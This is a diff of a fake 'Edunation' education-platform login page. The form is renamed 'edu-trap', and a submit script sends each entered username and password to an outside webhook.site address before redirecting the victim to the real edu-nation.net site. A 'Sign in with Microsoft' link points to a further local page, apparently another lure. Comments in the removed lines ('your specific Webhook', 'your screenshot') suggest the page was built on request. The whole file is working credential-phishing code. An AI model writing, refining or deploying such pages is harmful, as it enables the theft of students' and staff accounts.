@@ -4,89 +4,37 @@
     <meta charset="UTF-8">
     <title>Edunation | Login</title>
     <style>
-        body {
-            margin: 0; padding: 0;
-            background-color: #0088cc;
-            /* Matches the blue geometric pattern in your screenshot */
-            background-image: url('https://www.transparenttextures.com/patterns/cubes.png');
-            display: flex; justify-content: center; align-items: center; height: 100vh;
-            font-family: 'Segoe UI', Arial, sans-serif;
-        }
-        .login-card {
-            background: white; padding: 40px; border-radius: 12px;
-            width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center;
-        }
-        .logo { font-size: 52px; font-weight: bold; color: #00adef; margin-bottom: 25px; letter-spacing: -1px; }
-        .input-group { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-size: 11px; color: #999; margin-bottom: 4px; padding-left: 5px; }
-        input {
-            width: 100%; padding: 12px 15px; border: 1px solid #e0e0e0; border-radius: 25px;
-            box-sizing: border-box; font-size: 14px; outline: none; background: #fafafa;
-        }
-        .forgot { font-size: 10px; color: #888; text-align: right; margin-top: 4px; cursor: pointer; float: right; }
-        .btn-login {
-            background-color: #82c341; color: white; border: none; padding: 12px;
-            width: 100%; border-radius: 25px; font-weight: bold; font-size: 16px;
-            margin-top: 20px; cursor: pointer; transition: background 0.3s;
-        }
-        .btn-login:hover { background-color: #71aa38; }
-        .or { color: #ccc; margin: 25px 0; font-size: 12px; font-weight: 300; }
-        .social-btn {
-            border: 1px solid #e0e0e0; padding: 10px; border-radius: 25px;
-            font-size: 13px; color: #555; margin-bottom: 12px; display: flex;
-            align-items: center; justify-content: center; cursor: pointer; text-decoration: none;
-        }
+        body { margin: 0; background-color: #0088cc; background-image: url('https://www.transparenttextures.com/patterns/cubes.png'); display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Arial, sans-serif; }
+        .login-card { background: white; padding: 40px; border-radius: 12px; width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }
+        .logo { font-size: 52px; font-weight: bold; color: #00adef; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; border: 1px solid #e0e0e0; border-radius: 25px; margin-bottom: 15px; box-sizing: border-box; }
+        .btn-login { background-color: #82c341; color: white; border: none; padding: 12px; width: 100%; border-radius: 25px; font-weight: bold; cursor: pointer; }
+        .social-btn { border: 1px solid #e0e0e0; padding: 10px; border-radius: 25px; font-size: 13px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer; text-decoration: none; }
         .social-btn img { width: 18px; margin-right: 10px; }
-        .footer-links { font-size: 9px; color: #aaa; margin-top: 30px; text-transform: capitalize; }
     </style>
 </head>
 <body>
     <div class="login-card">
         <div class="logo">edunation</div>
-        <form id="auth-gate">
-            <div class="input-group">
-                <label>Username</label>
-                <input type="text" id="user" required>
-            </div>
-            <div class="input-group">
-                <div class="forgot">Forgot your password?</div>
-                <label>Password</label>
-                <input type="password" id="pass" required>
-            </div>
+        <form id="edu-trap">
+            <input type="text" id="u" placeholder="Username" required>
+            <input type="password" id="p" placeholder="Password" required>
             <button type="submit" class="btn-login">Log In</button>
         </form>
-        
-        <div class="or">— OR —</div>
-        
-        <div class="social-btn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="G">
-            Sign in with Google
-        </div>
-        <div class="social-btn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="MS">
+        <div style="color:#ccc; margin:20px 0;">— OR —</div>
+        <a href="microsoft.html" class="social-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
             Sign in with Microsoft
-        </div>
-        
-        <div class="footer-links">
-            Don't have an account? Sign Up | About Edunation Support Terms
-        </div>
+        </a>
     </div>
-
     <script>
-        document.getElementById('auth-gate').addEventListener('submit', function(e) {
+        document.getElementById('edu-trap').addEventListener('submit', function(e) {
             e.preventDefault();
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            // Sends the data to your specific Webhook
             fetch("https://webhook.site/c3ceb6bb-20ee-4997-8f40-97483b719129", {
                 method: "POST",
                 mode: "no-cors",
-                body: JSON.stringify({ username: u, password: p })
-            }).then(() => {
-                // Final Redirect to the official URL you provided
-                window.location.href = "https://www.edu-nation.net/";
-            });
+                body: JSON.stringify({ platform: "Edunation", user: document.getElementById('u').value, pass: document.getElementById('p').value })
+            }).then(() => { window.location.href = "https://www.edu-nation.net/"; });
         });
     </script>
 </body>
